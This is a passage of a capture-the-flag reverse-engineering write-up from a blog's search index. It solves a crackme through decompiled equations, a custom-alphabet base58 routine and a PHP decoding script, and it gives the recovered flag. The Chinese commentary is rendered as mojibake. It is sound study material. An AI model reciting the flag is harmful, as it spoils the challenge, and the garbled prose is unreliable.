class="number">1078</span> * v11 + <span class="number">5007</span> * v10 + <span class="number">6568</span> * v9 + <span class="number">23034</span> * v8 + <span class="number">10150</span> * v7 + <span class="number">22949</span> * v6 + <span class="number">32646</span> * v5 + <span class="number">15255</span> * v12 == <span class="number">11284005</span></span><br><span class="line">    &amp;&amp; <span class="number">8010</span> * v11 + <span class="number">15430</span> * v10 + <span class="number">6657</span> * v9 + <span class="number">1009</span> * v8 + <span class="number">25691</span> * v7 + <span class="number">15960</span> * v6 + <span class="number">19493</span> * v5 + <span class="number">29491</span> * v12 == <span class="number">10759932</span></span><br><span class="line">    &amp;&amp; <span class="number">4605</span> * v11 + <span class="number">14468</span> * v10 + <span class="number">5017</span> * v9 + <span class="number">12805</span> * v8 + <span class="number">22973</span> * v7 + <span class="number">30584</span> * v6 + <span class="number">12620</span> * v5 + <span class="number">32085</span> * v12 == <span class="number">12085266</span></span><br><span class="line">    &amp;&amp; <span class="number">7478</span> * v11 + <span class="number">6524</span> * v10 + <span class="number">25994</span> * v9 + <span class="number">16215</span> * v8 + <span class="number">12864</span> * v7 + <span class="number">20574</span> * v6 + <span class="number">8882</span> * v5 + <span class="number">14794</span> * v12 == <span class="number">11323393</span></span><br><span class="line">    &amp;&amp; <span class="number">15263</span> * v11 + <span class="number">8821</span> * v10 + <span class="number">25489</span> * v9 + <span class="number">9598</span> * v8 + <span class="number">26847</span> * v7 + <span class="number">5175</span> * v6 + <span class="number">6515</span> * v5 + <span class="number">27411</span> * v12 == <span class="number">11677607</span> )</span><br><span class="line">  &#123;</span><br></pre></td></tr></table></figure><p>ä¸€å…±8ä½å­—ç¬¦ï¼ŒçŒœæµ‹å‰5ä½ä¸ºflag{ç„¶åè§£ä¸ªæ–¹ç¨‹ï¼ˆä¹Ÿå¯ä»¥ç›´æ¥éå†åä¸‰ä¸ªå­—ç¬¦çš„æ‰€æœ‰å¯èƒ½ï¼Œæ‰¾åˆ°ç¬¦åˆåˆ¤æ–­æ¡ä»¶çš„ï¼‰<br>å¾—åˆ° flag{Th3<br>ç„¶åæ¥åˆ°å…³é”®çš„checkå‡½æ•°ï¼Œçœ‹åˆ°è¿™é‡Œï¼Œ</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( j = 0; !v12[j]; ++j )</span><br><span class="line">      ;</span><br><span class="line">   <span class="built_in"> if </span>( j &gt;= v11 )</span><br><span class="line">      break;</span><br><span class="line">    v9 = 0;</span><br><span class="line">    while ( j &lt; v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = (v9 &lt;&lt; 8) + v12[j];</span><br><span class="line">      v12[j] = v1 / 58;</span><br><span class="line">      v9 = v1 % 58;</span><br><span class="line">      ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    v2 = v5++;</span><br><span class="line">    s[v2] = v9;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å†åŠ ä¸Šç”¨æ¥å–å€¼çš„table 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxy<br>æ„è¯†åˆ°è¿™æ˜¯å¯èƒ½æ˜¯ä¸ªæ”¹å˜å¯†ç è¡¨çš„base58ç¼–ç å˜å½¢ï¼Œäºæ˜¯å·æ‡’ï¼Œç™¾åº¦æ‰¾äº†ä¸€ä¸ªbase58çš„ç¼–ç è§£ç è„šæœ¬ï¼Œæ”¹å˜å¯†ç è¡¨ï¼Œ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$encode = <span class="string">"fQcoNZxMvNxAVW7UJh5vQNyyuaphLAGo8g"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>.$encode;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$decode = base58_decode($encode);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>.$decode;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">base58_encode</span><span class="params">($string)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $alphabet = <span class="string">'123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ'</span>;</span></span><br><span class="line"><span class="php">    $base = strlen($alphabet);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (is_string($string) === <span class="keyword">false</span> || !strlen($string)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $bytes = array_values(unpack(<span class="string">'C*'</span>, $string));</span></span><br><span class="line"><span class="php">    $decimal = $bytes[<span class="number">0</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i = <span class="number">1</span>, $l = count($bytes); $i &lt; $l; ++$i) &#123;</span></span><br><span class="line"><span class="php">        $decimal = bcmul($decimal, <span class="number">256</span>);</span></span><br><span class="line"><span class="php">        $decimal = bcadd($decimal, $bytes[$i]);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $output = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">while</span> ($decimal &gt;= $base) &#123;</span></span><br><span class="line"><span class="php">        $div = bcdiv($decimal, $base, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">        $mod = bcmod($decimal, $base);</span></span><br><span class="line"><span class="php">        $output .= $alphabet[$mod];</span></span><br><span class="line"><span class="php">        $decimal = $div;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($decimal &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">        $output .= $alphabet[$decimal];</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $output = strrev($output);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> (string) $output;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">base58_decode</span><span class="params">($base58)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $alphabet = <span class="string">'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'</span>;</span></span><br><span class="line"><span class="php">    $base = strlen($alphabet);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (is_string($base58) === <span class="keyword">false</span> || !strlen($base58)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $indexes = array_flip(str_split($alphabet));</span></span><br><span class="line"><span class="php">    $chars = str_split($base58);</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span> ($chars <span class="keyword">as</span> $char) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>($indexes[$char]) === <span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $decimal = $indexes[$chars[<span class="number">0</span>]];</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i = <span class="number">1</span>, $l = count($chars); $i &lt; $l; ++$i) &#123;</span></span><br><span class="line"><span class="php">        $decimal = bcmul($decimal, $base);</span></span><br><span class="line"><span class="php">        $decimal = bcadd($decimal, $indexes[$chars[$i]]);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $output = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">while</span> ($decimal &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">        $byte = bcmod($decimal, <span class="number">256</span>);</span></span><br><span class="line"><span class="php">        $output = pack(<span class="string">'C'</span>, $byte).$output;</span></span><br><span class="line"><span class="php">        $decimal = bcdiv($decimal, <span class="number">256</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $output;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>è§£ç å¾—åˆ°<br>sEcondBe5tTime1s_n0w}<br>flagåˆ°æ‰‹<br>åæ¥å‘ç°ï¼Œæ‹¿è¿™ç¨‹åºå»è¿è¡Œï¼Œåªè¦flagçš„åé¢ä¸€åŠï¼Œä¹Ÿèƒ½è¿‡ï¼Œæ‰€ä»¥ä¸€å¼€å§‹å…¶å®æ˜¯å¿½ç•¥äº†è¿™ä¸ªcheck timeï¼ˆï¼‰å‡½æ•°ã€‚ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
